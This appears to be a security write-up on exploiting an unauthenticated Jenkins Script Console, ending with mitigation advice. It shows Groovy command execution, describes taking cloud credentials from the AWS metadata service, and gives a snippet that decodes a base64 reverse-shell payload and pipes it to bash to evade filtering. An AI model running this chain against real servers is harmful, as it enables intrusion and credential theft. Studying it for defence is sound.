Jenkins Script Console: From Discovery to Shell

Jenkins & The Script Console

Jenkins is an automation server used widely for CI/CD pipelines. The Script Console (/script) is an administrative feature that executes Groovy scripts directly on the Jenkins server. When accessible without authentication, it provides complete system-level access.

Finding Exposed Instances

During reconnaissance, I identified a Jenkins instance with the script console accessible at /script without requiring credentials. No login prompt. No authentication checks. Just direct access to server-side code execution.

Command Execution

The script console executes Groovy code, which provides direct access to the underlying Java runtime and system commands. A simple test confirms execution capabilities:

Using "whoami".execute().text returns the current user context. This confirms we can run arbitrary commands with the privileges of the Jenkins process. Depending on the deployment, this could be a dedicated service account or, in poorly configured environments, root.

Data Exfiltration

Beyond command execution, the console provides access to environment variables and instance metadata. In cloud environments, this often includes sensitive credentials:

AWS metadata endpoints are particularly interesting. Jenkins instances running on EC2 can access IAM role credentials, account information, and other sensitive data through the instance metadata service. A single Groovy script can extract this information.

Establishing Persistence

For a proper shell, we need to establish a reverse connection. The Groovy runtime makes this straightforward:

def encodedCmd = "base64_encoded_reverse_shell_payload"
def cmd = ["bash", "-c", "echo " + encodedCmd + " | base64 -d | bash"]

try {
    def process = cmd.execute()
    println "Shell initiated"
} catch (Exception e) {
    println "Error: " + e.message
}

This executes a base64-encoded reverse shell payload. The encoding helps bypass basic input filtering. With a netcat listener on the attacker machine, the connection establishes, providing interactive shell access to the Jenkins server.

Impact & Scope

An exposed Jenkins script console represents critical infrastructure compromise. Attackers gain:

  • Full access to source code repositories connected to Jenkins
  • Credentials stored in Jenkins (API keys, passwords, tokens)
  • Ability to modify build pipelines and inject malicious code
  • Access to deployment systems and production environments
  • Cloud credentials if running on AWS, Azure, or GCP

Mitigation

The script console should never be accessible without authentication. Proper security configuration includes:

  • Enforcing authentication for all administrative functions
  • Using role-based access control (RBAC) to limit script console access
  • Running Jenkins with minimal privileges (not root)
  • Network segmentation to restrict Jenkins access
  • Regular security audits of Jenkins configurations

Jenkins is a powerful automation tool. When improperly secured, that power becomes an attack vector. The script console is meant for administrative maintenance, not public access.
